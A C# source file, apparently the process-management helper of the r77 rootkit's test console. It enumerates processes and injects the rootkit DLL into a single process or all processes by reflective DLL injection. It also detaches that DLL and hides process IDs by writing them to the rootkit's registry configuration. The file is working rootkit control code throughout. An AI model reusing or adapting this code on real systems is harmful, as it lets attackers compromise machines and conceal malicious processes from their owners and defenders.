using BytecodeApi;
using BytecodeApi.Extensions;
using BytecodeApi.IO;
using Global;
using Microsoft.Win32;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using TestConsole.Model;

namespace TestConsole.Helper;

/// <summary>
/// Interface to inject r77 to or detach r77 from running processes.
/// </summary>
internal static class ProcessList
{
	private static readonly Icon? DefaultIcon = ExtractFileIcon(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "svchost.exe"));
	private static readonly Dictionary<string, Icon> IconCache = [];

	/// <summary>
	/// Gets a list of all processes.
	/// </summary>
	/// <returns>
	/// A new <see cref="ProcessModel" />[] with all running processes.
	/// </returns>
	public static ProcessModel[] GetProcesses()
	{
		if (HelperDll.GetProcessList() is not HelperDll.ProcessListEntry[] entries)
		{
			return [];
		}

		return entries
			.Select(entry => new ProcessModel
			{
				Id = entry.ProcessId,
				Name = entry.Name,
				Is64Bit = entry.Platform == 32 ? false : entry.Platform == 64 ? true : null,
				IntegrityLevel = entry.IntegrityLevel >= ProcessIntegrityLevel.Untrusted ? entry.IntegrityLevel : null,
				User = entry.UserName,
				Icon = GetIcon(entry.Name, entry.FullName),
				CanInject =
					entry.Platform is 32 or 64 &&
					entry.IntegrityLevel >= ProcessIntegrityLevel.Untrusted &&
					(ApplicationBase.Process.IsElevated || entry.IntegrityLevel <= ProcessIntegrityLevel.Medium),
				IsInjected = entry.IsInjected,
				IsR77Service = entry.IsR77Service,
				IsHelper = entry.IsHelper,
				IsHiddenById = entry.IsHiddenById
			})
			.Where(process => process.Id is not 0 and not 4)
			.OrderBy(process => process.Name, StringComparer.OrdinalIgnoreCase)
			.ThenBy(process => process.Id)
			.ToArray();
	}
	/// <summary>
	/// Injects the specified process with the r77 DLL using reflective DLL injection.
	/// </summary>
	/// <param name="process">The process to inject.</param>
	/// <returns>
	/// <see langword="true" />, if this process was injected successfully;
	/// otherwise, <see langword="false" />.
	/// </returns>
	public static async Task<bool> Inject(ProcessModel process)
	{
		return await Task.Run(() =>
		{
			if (ApplicationDirectory.GetFilePath(process.Is64Bit == true ? "r77-x64.dll" : "r77-x86.dll") is not string dllPath)
			{
				return false;
			}

			if (!ProcessEx.IsRunning(process.Id))
			{
				Log.Warning(
					new LogFileItem(process.Name),
					new LogTextItem($"(PID {process.Id}) is no longer running.")
				);
				return false;
			}

			if (!HelperDll.Inject(process.Id, File.ReadAllBytes(dllPath)))
			{
				string? reason = null;

				if (process.Name.StartsWith(R77Const.HidePrefix, StringComparison.OrdinalIgnoreCase))
				{
					reason = $"The filename starts with '{R77Const.HidePrefix}'.";
				}
				else if (process.IsR77Service)
				{
					reason = "The process is the r77 service process.";
				}
				else if (process.IsHelper)
				{
					reason = "The process is a helper process.";
				}
				else if (process.IntegrityLevel < ProcessIntegrityLevel.Medium)
				{
					reason = "Sandboxes are not supported";
				}

				Log.Warning(
					new LogTextItem("Injection of"),
					new LogFileItem(process.Name),
					new LogTextItem($"(PID {process.Id}) failed."),
					reason != null ? new LogDetailsItem(reason) : null
				);
				return false;
			}

			Log.Information(
				new LogTextItem("Injected"),
				new LogFileItem(process.Name),
				new LogTextItem($"(PID {process.Id}).")
			);
			return true;
		});
	}
	/// <summary>
	/// Detaches r77 from the specified process.
	/// </summary>
	/// <param name="process">The process to detach.</param>
	/// <returns>
	/// <see langword="true" />, if this process was detached successfully;
	/// otherwise, <see langword="false" />.
	/// </returns>
	public static async Task<bool> Detach(ProcessModel process)
	{
		return await Task.Run(() =>
		{
			if (!ProcessEx.IsRunning(process.Id))
			{
				Log.Warning(
					new LogFileItem(process.Name),
					new LogTextItem($"(PID {process.Id}) is no longer running.")
				);
				return false;
			}

			if (!HelperDll.Detach(process.Id))
			{
				Log.Warning(
					new LogTextItem("Detaching from"),
					new LogFileItem(process.Name),
					new LogTextItem($"(PID {process.Id}) failed.")
				);
				return false;
			}

			Log.Information(
				new LogTextItem("Detached from"),
				new LogFileItem(process.Name),
				new LogTextItem($"(PID {process.Id}).")
			);
			return true;
		});
	}
	/// <summary>
	/// Injects all processes with the r77 DLL using reflective DLL injection.
	/// </summary>
	public static async Task InjectAll()
	{
		await Task.Run(() =>
		{
			if (ApplicationDirectory.GetFilePath("r77-x86.dll") is not string dll32Path)
			{
				return;
			}

			if (ApplicationDirectory.GetFilePath("r77-x64.dll") is not string dll64Path)
			{
				return;
			}

			int injectedCount = GetInjectedCount();

			if (!HelperDll.InjectAll(File.ReadAllBytes(dll32Path), File.ReadAllBytes(dll64Path)))
			{
				Log.Error(new LogTextItem("Injecting processes failed."));
				return;
			}

			int newInjectedCount = GetInjectedCount();

			if (newInjectedCount == injectedCount)
			{
				Log.Information(new LogTextItem("No processes were injected"));
			}
			else if (newInjectedCount > injectedCount)
			{
				Log.Information(new LogTextItem($"Injected {newInjectedCount - injectedCount} processes."));
			}
		});
	}
	/// <summary>
	/// Detaches r77 from all running processes.
	/// </summary>
	public static async Task DetachAll()
	{
		await Task.Run(() =>
		{
			int injectedCount = GetInjectedCount();

			if (injectedCount == 0)
			{
				Log.Information(new LogTextItem("No processes are injected."));
				return;
			}

			if (!HelperDll.DetachAll())
			{
				Log.Error(new LogTextItem("Detaching processes failed."));
				return;
			}

			int newInjectedCount = GetInjectedCount();

			if (newInjectedCount < injectedCount)
			{
				Log.Information(new LogTextItem($"Detached from {injectedCount - newInjectedCount} processes."));
			}

			if (newInjectedCount > 0)
			{
				Log.Warning(new LogTextItem($"{newInjectedCount} processes could not be detached."));
			}
		});
	}
	/// <summary>
	/// Hides a process ID by entering the PID into the r77 configuration system.
	/// </summary>
	/// <param name="process">The process to hide by ID.</param>
	/// <returns>
	/// <see langword="true" />, if this process was successfully marked as hidden;
	/// otherwise, <see langword="false" />.
	/// </returns>
	public static async Task<bool> Hide(ProcessModel process)
	{
		return await Task.Run(() =>
		{
			if (!ConfigSystem.EnsureConfigSystem())
			{
				return false;
			}

			using RegistryKey? configKey = ConfigSystem.GetConfigSystemKey();
			using RegistryKey? key = configKey?.CreateSubKey("pid");

			if (key == null)
			{
				return false;
			}

			key.SetInt32Value($"TestConsole_HiddenPID_{process.Id}", process.Id);

			Log.Information(
				new LogFileItem(process.Name),
				new LogTextItem($"(PID {process.Id}) is marked as hidden.")
			);

			if (process.Name.StartsWith(R77Const.HidePrefix))
			{
				Log.Warning(
					new LogFileItem(process.Name),
					new LogTextItem($"(PID {process.Id}) is already hidden by prefix. Hiding the process by ID is unnecessary.")
				);
			}

			if (GetInjectedCount() == 0)
			{
				Log.Warning(new LogTextItem("r77 needs to be installed, or at least injected in a task manager for process hiding to have effect."));
			}

			return true;
		});
	}
	/// <summary>
	/// Removes a process ID from the r77 configuration system to make the process visible again.
	/// </summary>
	/// <param name="process">The process to unhide.</param>
	/// <returns>
	/// <see langword="true" />, if this process was successfully marked as visible;
	/// otherwise, <see langword="false" />.
	/// </returns>
	public static async Task<bool> Unhide(ProcessModel process)
	{
		return await Task.Run(() =>
		{
			using RegistryKey? configKey = ConfigSystem.GetConfigSystemKey();
			using RegistryKey? key = configKey?.OpenSubKey("pid", true);

			if (key == null)
			{
				return false;
			}

			string[] valueNames = key
				.GetValueNames()
				.Where(name => key.GetInt32Value(name) == process.Id)
				.ToArray();

			if (valueNames.Any())
			{
				foreach (string valueName in valueNames)
				{
					key.DeleteValue(valueName);
				}

				Log.Information(
					new LogFileItem(process.Name),
					new LogTextItem($"(PID {process.Id}) is marked as not hidden.")
				);
			}

			return true;
		});
	}

	private static int GetInjectedCount()
	{
		return GetProcesses().Count(process => process.IsInjected);
	}
	private static Icon? GetIcon(string fileName, string? fullPath)
	{
		// If the full path is unknown, attempt to find the file in C:\Windows and C:\Windows\System32
		if (fullPath.IsNullOrEmpty())
		{
			fullPath = new[]
			{
				Environment.SpecialFolder.System,
				Environment.SpecialFolder.Windows
			}
			.Select(folder => Path.Combine(Environment.GetFolderPath(folder), fileName))
			.FirstOrDefault(File.Exists);
		}

		if (!fullPath.IsNullOrEmpty())
		{
			// Once an icon was retrieved, keep the icon in the cache.
			if (IconCache.TryGetValue(fullPath.ToLower(), out Icon? cachedIcon))
			{
				return cachedIcon;
			}
			else if (ExtractFileIcon(fullPath) is Icon icon)
			{
				IconCache[fullPath.ToLower()] = icon;
				return icon;
			}
		}

		// Display the default executable icon.
		return DefaultIcon;
	}
	private static Icon? ExtractFileIcon(string fileName)
	{
		Native.SHFileInfo fileInfo = new();

		try
		{
			if (File.Exists(fileName))
			{
				Native.SHGetFileInfo(fileName, 0, ref fileInfo, Marshal.SizeOf<Native.SHFileInfo>(), 257);
				return (Icon)Icon.FromHandle(fileInfo.Icon).Clone();
			}

			return null;
		}
		catch
		{
			return null;
		}
		finally
		{
			if (fileInfo.Icon != 0)
			{
				Native.DestroyIcon(fileInfo.Icon);
			}
		}
	}
}

file static class Native
{
	[DllImport("shell32.dll")]
	public static extern nint SHGetFileInfo(string path, uint fileAttributes, ref SHFileInfo fileInfo, int fileInfoSize, uint flags);
	[DllImport("user32.dll", SetLastError = true)]
	public static extern bool DestroyIcon(nint icon);

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
	public struct SHFileInfo
	{
		public nint Icon;
		public int Index;
		public uint Attributes;
		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
		public string DisplayName;
		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)]
		public string TypeName;
	}
}